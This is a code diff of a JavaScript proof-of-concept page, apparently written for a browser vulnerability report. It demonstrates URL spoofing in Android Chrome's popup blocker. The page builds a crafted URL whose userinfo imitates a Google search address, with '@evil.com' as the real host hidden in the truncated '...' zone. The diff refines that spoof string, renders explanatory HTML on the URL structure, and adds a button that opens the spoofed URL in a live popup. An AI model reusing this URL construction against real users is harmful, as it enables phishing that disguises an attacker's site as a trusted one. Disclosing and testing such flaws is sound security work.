@@ -1,5 +1,5 @@
-// Popup URL Spoof — Visual POC (Android Chrome Popup Blocker)
-// Demonstrates URL truncation makes legit + spoofed URLs identical
+// Popup URL Spoof — Visual Demo + Live Test
+// URL structure: https://[userinfo-without-slash]@[evil.com]/[path]#[fragment-match]
 
 (function() {
   var d = document.getElementById('display');
@@ -12,28 +12,22 @@
     return url.substring(0, pre) + '...' + url.substring(url.length - suf);
   }
 
-  // The legit URL — victim expects to see Google search
+  // Legitimate URL
   var LEGIT = 'https://www.google.com/search?q=what+is+claude';
 
-  // Spoofed URL: @evil.com hidden in truncation "...", prefix+suffix match exactly
-  // Prefix: "https://www.google.com/se" ← matches (both start with "search")
-  // Suffix: "arch?q=what+is+claude"   ← matches (#search?q=... fragment)
-  // @evil.com + padding x's = truncated zone
-  var SPOOF = 'https://www.google.com/search' +
-              '.verify.login.security' + '.x'.repeat(15) +
+  // FIXED Spoof URL:
+  // - Userinfo uses - and . (no / allowed before @)
+  // - /search-verify... looks like /search?q=... prefix
+  // - @evil.com is the real host
+  // - Path + fragment matches legit suffix
+  var SPOOF = 'https://www.google.com/search-verify-account-login' +
+              '-security-check' + '-x'.repeat(10) +
               '@evil.com' +
-              '/' + 'x'.repeat(40) +
-              '#search?q=what+is+claude';
-
-  // Also test the exact original attack format
-  var SPOOF2 = 'https://www.google.com' + '.a'.repeat(40) +
-               '@evil.com' + '/' + 'x'.repeat(40) +
-               '#search?q=what+is+claude';
+              '/search?q=what+is+claude';
 
   var tests = [
-    { label: 'LEGITIMATE URL', url: LEGIT, cls: 'legit' },
-    { label: 'SPOOFED URL (real host: evil.com)', url: SPOOF, cls: 'spoof' },
-    { label: 'SPOOFED URL v2 (real host: evil.com)', url: SPOOF2, cls: 'spoof' }
+    { label: 'LEGITIMATE (google.com)', url: LEGIT, cls: 'legit' },
+    { label: 'SPOOFED (real host: evil.com)', url: SPOOF, cls: 'spoof' }
   ];
 
   var legitShort = trunc(LEGIT, 45);
@@ -42,38 +36,35 @@
   for (var i = 0; i < tests.length; i++) {
     var t = tests[i];
     var short = trunc(t.url, 45);
-    var ident = (short === legitShort && i > 0);
     html +=
       '<div class="url-box ' + t.cls + '">' +
-        '<div class="label">' + t.label +
-          (ident ? ' <span style="color:#ea4335">⚠ MATCH</span>' : '') +
-        '</div>' +
+        '<div class="label">' + t.label + '</div>' +
         '<div class="url-text">' + short + '</div>' +
-        '<div class="full">' + t.url.substring(0, 70) + '...</div>' +
       '</div>';
   }
 
-  html += '<div class="verdict" style="background:#fef7e0;color:#e37400">' +
-    '⚠ After truncation (~45 chars), spoofed URL looks IDENTICAL to legitimate Google URL.<br>' +
-    '<b>@evil.com</b> is hidden in the <b>"..."</b> truncation zone.<br>' +
-    'Victim cannot distinguish real Google URL from attacker URL in popup blocker.' +
+  var spoofShort = trunc(SPOOF, 45);
+  html += '<div class="verdict" style="' +
+    (legitShort === spoofShort ? 'background:#fef7e0;color:#e37400' : 'background:#f0fff4;color:#5f6368') +
+    '">' +
+    (legitShort === spoofShort
+      ? '⚠ Both URLs look IDENTICAL after truncation'
+      : 'URLs look similar — @evil.com hidden in "..." truncation zone') +
     '</div>';
 
-  // How it works
-  html += '<div class="explain">' +
-    '<b>URL Structure of Spoofed URL:</b><br>' +
-    '<code style="font-size:10px;word-break:break-all">' +
-    'https://[userinfo that matches google.com/search...]' +
-    '<b style="color:#ea4335">@evil.com</b>' +
-    '/[padding]#[suffix that matches search?q=...]' +
-    '</code><br><br>' +
-    '• <b>Userinfo section</b> (before @): shown as URL prefix in popup UI<br>' +
-    '• <b>@evil.com</b>: the REAL destination — falls in "..." truncation zone<br>' +
-    '• <b>Fragment section</b> (after #): shown as URL suffix in popup UI<br>' +
+  // Explain URL structure
+  html += '<div style="font-size:10px;color:#888;margin-top:10px;text-align:left;line-height:1.6">' +
+    '<b>Spoofed URL structure:</b><br>' +
+    '<code>https://www.google.com/search-verify-...-login<b style="color:#ea4335">@evil.com</b>/search?q=what+is+claude</code><br>' +
+    '<code>────────── userinfo (no /) ──────────█──── host ───█── path+query ──────────</code><br><br>' +
+    '• <b>Userinfo</b> (before @): uses - and . — valid URL characters<br>' +
+    '• <b>@evil.com</b>: the real destination — hidden in popup truncation<br>' +
+    '• <b>/search?q=...</b>: matches legit URL suffix exactly<br>' +
     '</div>';
 
   d.innerHTML = html;
 
+  // Open popups for live test
   document.getElementById('btnOpen').addEventListener('click', function() {
     window.open(LEGIT, '_blank');
     window.open(SPOOF, '_blank');
